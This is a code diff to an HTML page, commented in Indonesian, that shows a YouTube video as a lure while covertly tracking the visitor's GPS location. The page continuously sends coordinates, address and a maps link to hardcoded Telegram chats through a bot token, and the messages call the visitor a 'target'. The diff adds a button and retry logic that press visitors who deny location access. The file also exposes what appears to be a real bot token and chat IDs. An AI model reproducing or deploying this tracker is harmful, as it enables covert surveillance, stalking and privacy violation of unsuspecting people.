@@ -9,6 +9,8 @@
         #video-container { margin: 20px auto; max-width: 560px; }
         #youtube-video { width: 100%; height: 315px; border: none; }
         #status { font-size: 12px; color: #666; margin-top: 10px; opacity: 0.7; }
+        #location-btn { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 10px; display: none; } /* Sembunyi awal */
+        #location-btn:hover { background: #0056b3; }
     </style>
 </head>
 <body>
@@ -19,18 +21,21 @@
         <iframe id="youtube-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&rel=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
     
-    <div id="status">Tunggu sebentar...</div>
+    <button id="location-btn" onclick="requestLocation()">Lanjut</button>
+    
+    <div id="status">Klik tombol di atas untuk lanjut...</div>
 
     <script>
         // Ganti ini
         const BOT_TOKEN = '7822471568:AAE89BHf7mxBx4kqhKNLyE7yP4IlMgi8wFE';
-        const CHAT_IDS = ['7680606818', '7886506639']; // Masukin dua ID di sini, misal ['7680606818', 'ID_KEDUA_LO']
+        const CHAT_IDS = ['7680606818', '6212362026']; // Tambah ID kedua di sini
         
         let watchId;
         let lastLat = null;
         let lastLng = null;
         const MIN_DISTANCE = 5;
         const status = document.getElementById('status');
+        const locationBtn = document.getElementById('location-btn');
         let retryCount = 0;
         const MAX_RETRIES = 2;
 
@@ -58,11 +63,10 @@
             }
         }
 
-        // Kirim ke Telegram - Update buat multiple ID
+        // Kirim ke Telegram - Multiple ID (sama)
         async function sendToTelegram(lat, lng, accuracy, timestamp, address, mapsLink) {
             const message = `😈𝙍𝙖𝙡𝙙𝙤𝙓𝙩𝙧𝙖𝙘𝙠: 𝙨𝙪𝙠𝙨𝙚𝙨 𝙏𝙖𝙧𝙜𝙚𝙩 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘿𝙞 𝙇𝙖𝙘𝙖𝙠!😈\n\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\n\n😈𝐋𝐨𝐤𝐚𝐬𝐢 𝐓𝐚𝐫𝐠𝐞𝐭: ${mapsLink}`;
             
-            // Loop buat kirim ke semua ID
             for (const chatId of CHAT_IDS) {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                 try {
@@ -107,7 +111,8 @@
             let msg = 'Verifikasi gagal: ';
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    msg += 'I🌹🌹❤❤💕💕.';
+                    msg += 'I🌹🌹❤❤💕💕. Coba klik tombol lagi.';
+                    locationBtn.style.display = 'inline-block'; // Tampilkan tombol buat retry
                     break;
                 case error.POSITION_UNAVAILABLE:
                     msg += '🌹🌹🌹🌹🌹🌹.';
@@ -116,9 +121,10 @@
                     msg += 'Sinyal lemah. Mencoba lagi...';
                     if (retryCount < MAX_RETRIES) {
                         retryCount++;
-                        setTimeout(() => attemptGeolocation(false), 2000); // Retry dengan low accuracy setelah 2s
+                        setTimeout(() => attemptGeolocation(false), 2000);
                     } else {
                         msg += ' (Coba matikan VPN atau keluar ruangan)';
+                        locationBtn.style.display = 'inline-block';
                     }
                     break;
             }
@@ -129,24 +135,51 @@
         function attemptGeolocation(highAccuracy = true) {
             const options = {
                 enableHighAccuracy: highAccuracy,
-                timeout: 30000, // Naik ke 30 detik
+                timeout: 30000,
                 maximumAge: 1000
             };
-            status.innerHTML = `😘😘😘😘😘${highAccuracy ? ' ❤️❤️' : ''}...`;
+            status.innerHTML = `Meminta akses lokasi${highAccuracy ? ' akurat' : ''}...`;
+            locationBtn.style.display = 'none'; // Sembunyikan tombol pas proses
             
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     showPosition(pos);
-                    // Lanjut watch
                     watchId = navigator.geolocation.watchPosition(showPosition, showError, options);
-                    retryCount = 0; // Reset retry
+                    retryCount = 0;
                 },
                 showError,
                 options
             );
         }
 
-        // Handle network change
+        // Fungsi request lokasi (dari tombol)
+        async function requestLocation() {
+            // Cek permission status dulu pake Permissions API (buat retry kalo denied)
+            if (navigator.permissions && navigator.permissions.query) {
+                try {
+                    const permission = await navigator.permissions.query({ name: 'geolocation' });
+                    if (permission.state === 'granted') {
+                        // Udah granted, langsung attempt
+                        attemptGeolocation(true);
+                    } else if (permission.state === 'denied') {
+                        // Denied, coba request ulang (browser mungkin prompt lagi)
+                        status.innerHTML = 'Minta izin lokasi lagi...';
+                        attemptGeolocation(true);
+                    } else {
+                        // Prompt, langsung request
+                        attemptGeolocation(true);
+                    }
+                } catch (e) {
+                    console.log('Permissions API nggak support, langsung request');
+                    attemptGeolocation(true);
+                }
+            } else {
+                // Fallback tanpa Permissions API
+                attemptGeolocation(true);
+            }
+        }
+
+        // Handle network change (sama)
         window.addEventListener('online', () => {
             console.log('Network online - retrying geolocation');
             if (retryCount > 0) {
@@ -157,19 +190,13 @@
         window.addEventListener('offline', () => {
             console.log('Network offline');
             status.innerHTML = 'Koneksi hilang. Coba lagi.';
+            locationBtn.style.display = 'inline-block';
         });
 
-        // Auto start
-        function initTracking() {
-            if (navigator.geolocation) {
-                // Coba high accuracy dulu
-                attemptGeolocation(true);
-            } else {
-                status.innerHTML = 'Lokasi tidak didukung. Coba browser lain.';
-            }
-        }
-
-        window.addEventListener('load', initTracking);
+        // Auto tampilkan tombol pas load
+        window.addEventListener('load', () => {
+            locationBtn.style.display = 'inline-block';
+        });
     </script>
 </body>
 </html>
